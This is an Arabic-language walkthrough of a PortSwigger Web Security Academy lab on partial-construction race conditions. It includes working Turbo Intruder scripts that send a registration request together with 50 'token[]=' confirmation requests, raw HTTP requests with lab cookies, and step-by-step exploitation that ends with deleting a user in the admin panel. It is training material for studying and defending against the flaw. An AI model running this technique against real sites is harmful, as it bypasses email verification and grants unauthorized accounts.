# Lab : Partial construction race conditions

https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction

- الفكره من الLab ده

```bash
1. def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a34002e033fa8018044493200aa0085.web-security-academy.net
Cookie: phpsessionid=AvEPIBjqUib1hl9zQYN8tsxFISYGqTUH
Content-Length: 0

'''
    for attempt in range(200):
        currentAttempt = str(attempt)
        username = 'AAAA' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    if 'token[]=' in req.request and 'successful' in req.response:
        table.add(req)
        
        
2. POST /register HTTP/2
Host: 0a34002e033fa8018044493200aa0085.web-security-academy.net
Cookie: phpsessionid=AvEPIBjqUib1hl9zQYN8tsxFISYGqTUH
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Origin: https://0a34002e033fa8018044493200aa0085.web-security-academy.net
Referer: https://0a34002e033fa8018044493200aa0085.web-security-academy.net/register
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=Et4kGUjOR0wV5BZH3W53YdmEnEJ2JZOG&username=%s&email=AAAA%40ginandjuice.shop&password=test123456789
```

اللاب ده من أصعب لابات الـ Race Conditions، ويُعرف بـ **"Partial Construction Race Condition"** — الفكرة: السيرفر بيعمل عملية إنشاء مستخدم جديد (`INSERT` في قاعدة البيانات) على **عدة خطوات متتالية**، مش في خطوة واحدة atomic. فيه **لحظة انتقالية (transient state)** بين "بدء إنشاء المستخدم" و"اكتمال إنشائه بالكامل (بما فيه قيمة الـ token)"، وخلال اللحظة دي، **حقل الـ token بيكون فاضي/غير مُهيّأ (null أو equivalent)** — ولو قدرت تبعت طلب تأكيد بتوكن "يعادل null" بالظبط في اللحظة دي، النظام ممكن يقبله كتأكيد صحيح.

### الهدف من اللاب

التسجيل مقصور على إيميلات `@ginandjuice.shop` بس، ولازم تأكيد عبر إيميل. بما إننا مش عندنا وصول لإيميل حقيقي من الدومين ده، الهدف: **نتجاوز خطوة التأكيد بالكامل** عن طريق استغلال الـ race condition، ونسجل حساب بإيميل عشوائي من غير ما نملكه فعلاً.

### خطوات الحل بالتفصيل

#### المرحلة 1: توقع التصادم المحتمل (Predict a potential collision)

1. ادرس آلية التسجيل: التسجيل بإيميل `@ginandjuice.shop` بس، ولازم رابط تأكيد من الإيميل.
2. في الـ Proxy history، لاقي طلب لجلب `/resources/static/users.js` — ده ملف JS بيولّد فورم صفحة التأكيد ديناميكيًا. بدراسته هتكتشف إن التأكيد بيتم عن طريق:

```
   POST /confirm?token=X
```

1. جهّز طلب تأكيد مشابه في Repeater:

```
   POST /confirm?token=1 HTTP/2
```

1. جرب حالات مختلفة للـ `token`:
    - توكن عشوائي → `Incorrect token: X`
    - من غير الـ parameter خالص → `Missing parameter: token`
    - توكن فاضي (`token=`) → **`Forbidden`** (رد مختلف ومثير للريبة — غالبًا دي حماية اتعملت عمدًا ضد استغلال سابق لنفس الفكرة بالتحديد).
2. **الفرضية**: بما إن `Forbidden` ظهرت تحديدًا مع توكن فاضي، يبقى المطورين **عارفين إن فيه خطر من إرسال قيمة "فاضية/null-equivalent"** وحاولوا يمنعوها. السؤال: **هل فيه طريقة تانية لتمثيل "null" غير `token=` الفاضية دي؟**
3. جرب صيغة بديلة لتمثيل "array فاضي" (تقنية شائعة في فريمووركات بتقبل query parameters كـ arrays):

```
   POST /confirm?token[]=
```

1. **النتيجة**: بدل `Forbidden`، رجعلك `Invalid token: Array` — ده دليل إن الصيغة دي **عدّت الحماية المخصصة ضد التوكن الفاضي**، ونجحنا نبعت "قيمة تعادل null" (array فاضي) من غير ما نتوقف عند فلتر الـ `Forbidden`.

#### المرحلة 2: قياس السلوك (Benchmark)

1. ابعت `POST /register` على Repeater.
2. لاحظ إن محاولة تسجيل نفس اليوزرنيم مرتين بترجع رد مختلف (`Account already exists`).
3. جهّز طلب `POST /confirm?token[]=` تاني في تاب منفصل (بنفس session cookie بتاعتك).
4. حط الطلبين في **Group واحدة**.
5. جرب تبعتهم بالتتابع وبالتوازي كذا مرة (مع تغيير اليوزرنيم كل مرة لتفادي "already exists").
6. **لاحظ**: رد طلب التأكيد (`/confirm`) **بيوصل أسرع بكتير** من رد طلب التسجيل (`/register`) — يعني طلب التأكيد بيتنفذ بسرعة لأنه بيفحص وجود توكن في الداتابيز بسرعة، بينما التسجيل بياخد وقت أطول (بيعمل كذا خطوة: إنشاء يوزر، توليد توكن، تخزينه، إلخ).

#### المرحلة 3: إثبات المفهوم (Prove the concept)

**التحدي**: بما إن طلب التأكيد بيرد **أسرع** من طلب التسجيل، لو بعتناهم بالتوازي العادي، طلب التأكيد هيوصل **قبل** ما السيرفر يبدأ حتى في إنشاء اليوزر — يعني مفيش فايدة. لازم **نؤخر** طلب التأكيد بطريقة ذكية بحيث يوصل **بالظبط** في النافذة الزمنية الصغيرة بين "بدء الإنشاء" و"اكتمال كتابة التوكن".

**الحل**: بدل طلب تأكيد واحد، نبعت **عدد كبير جدًا من طلبات التأكيد (زي 50)** في نفس اللحظة مع طلب التسجيل — عشان نزود الاحتمال الإحصائي إن **واحد منهم على الأقل** يوصل بالظبط في الفجوة الزمنية الضيقة دي.

1. حدد قيمة الـ `username` في `POST /register`، كليك يمين → **Extensions > Turbo Intruder > Send to turbo intruder**.
2. في الـ request editor:
    - الـ `username` اتحدد تلقائيًا كـ payload position (`%s`).
    - تأكد الـ `email` ثابت على إيميل `@ginandjuice.shop` عشوائي غير مسجّل.
    - سجّل قيمة الـ `password` الثابتة.
3. اختار قالب `examples/race-single-packet-attack.py`.
4. عدّل السكريبت بحيث:
    - لكل محاولة (20 محاولة)، يبعت **طلب تسجيل واحد بيوزرنيم فريد**.
    - ولكل محاولة، يبعت **50 طلب تأكيد** (`token[]=`) معاه، كلهم بنفس الـ "gate".
    - يفتح الـ gate لكل محاولة بحيث **كل الـ 51 طلب (تسجيل + 50 تأكيد) يتبعتوا في نفس اللحظة تقريبًا**.

python

```python
def queueRequests(target, wordlists):    engine = RequestEngine(endpoint=target.endpoint,                            concurrentConnections=1,                            engine=Engine.BURP2)    confirmationReq = '''POST /confirm?token[]= HTTP/2Host: YOUR-LAB-ID.web-security-academy.netCookie: phpsessionid=YOUR-SESSION-TOKENContent-Length: 0'''    for attempt in range(20):        currentAttempt = str(attempt)        username = 'User' + currentAttempt        engine.queue(target.req, username, gate=currentAttempt)        for i in range(50):            engine.queue(confirmationReq, gate=currentAttempt)        engine.openGate(currentAttempt)def handleResponse(req, interesting):    table.add(req)
```

1. شغّل الهجوم (**Launch attack**).
2. رتّب النتائج حسب عمود **Length**.
3. دوّر على رد **`200`** فيه رسالة:

```
    Account registration for user <USERNAME> successful
```

1. سجّل اليوزرنيم ده (زي `User4`).
2. سجل دخول بالـ username ده والباسورد الثابت اللي استخدمته في التسجيل.
3. افتح الأدمن بانل واحذف `carlos`. اللاب هيتحل تلقائيًا ✅.

### ليه ده بيحصل تقنيًا

php

```php
function register_user($username, $email, $password) {    $user_id = db_insert_pending_user($username, $email, $password);   // الخطوة 1: إنشاء سجل مبدئي// ⏳ فجوة زمنية هنا — الحقل token لسه NULL أو غير موجود!    $token = generate_token();    db_update_token($user_id, $token);   // الخطوة 2: تحديث التوكن لاحقًا    send_confirmation_email($email, $token);}function confirm_registration($submitted_token) {    if ($submitted_token == null) {        return "Forbidden";   // ✅ حماية صريحة ضد توكن null مباشر    }    $user = db_find_user_by_token($submitted_token);   // ❌ لو $submitted_token كانت array فاضية،//    المقارنة مع عمود NULL في الداتابيز ممكن تنجح!    if ($user) {        activate_account($user);        return "Account registration successful";    }    return "Invalid token";}
```

المشكلة الجوهرية مركّبة من نقطتين:

1. **إنشاء المستخدم عملية متعددة الخطوات (multi-step) مش atomic** — فيه "حالة وسيطة (partial construction state)" بيكون فيها السجل موجود في الداتابيز، لكن **التوكن لسه مش مكتوب (NULL)**.
2. **الحماية ضد `token=''` (فاضي صريح) موجودة، لكن مش ضد تمثيل مختلف لـ "null-equivalent"** زي `token[]=` (array فاضي) — وده بيوضح إن المطورين **رقّعوا الثغرة المعروفة بس**، مش السبب الجذري (المقارنة الضعيفة مع NULL في قاعدة البيانات).

### الدرس المستفاد

- **عمليات إنشاء الكيانات (entity creation) المتعددة الخطوات لازم تكون atomic بالكامل** — السجل ميظهرش في قاعدة البيانات (أو ميبقاش قابل للاستعلام) إلا لما **كل الحقول المطلوبة (بما فيها التوكن) تكون مكتوبة بالكامل**.
- **الترقيع الجزئي (patching) لثغرة معروفة (زي منع `token=''`) من غير معالجة السبب الجذري (ضعف المقارنة مع NULL) بيسيب ثغرات بديلة قابلة للاستغلال** بتمثيلات مختلفة لنفس "القيمة الفارغة" (زي `token[]=` في فريمووركات بتدعم array parsing).
- **"Single-packet attack" في Turbo Intruder** ضروري هنا لأنه بيسمح بـ **إرسال عدد كبير جدًا من الطلبات (50+ طلب) في نفس اللحظة بالضبط** زيادة الاحتمال الإحصائي لإصابة فجوة زمنية **صغيرة جدًا جدًا** (مللي ثانية أو أقل)، وده مستحيل تحقيقه يدويًا حتى بأفضل استخدام لـ Repeater Groups.
- **منهجية الاكتشاف هنا** اعتمدت على **التحليل الدقيق لرسائل الخطأ المختلفة** (`Forbidden` مقابل `Invalid token: Array`) كدليل على وجود **فحص أمني متخصص ضد سيناريو معين**، وهو بالضبط ما وجّه الباحث لتجربة تمثيلات بديلة للقيمة المحظورة.
- ده نموذج متقدم يوضح إن **race conditions مش بس عن "نفس الطلب يتكرر بسرعة"**، لكن ممكن تكون عن **استغلال حالة انتقالية قصيرة جدًا أثناء بناء كيان معقد (partial construction)** — وهي فئة أصعب بكتير في الاكتشاف والاستغلال من أنواع الـ race conditions الأبسط اللي شرحناها قبل كده.
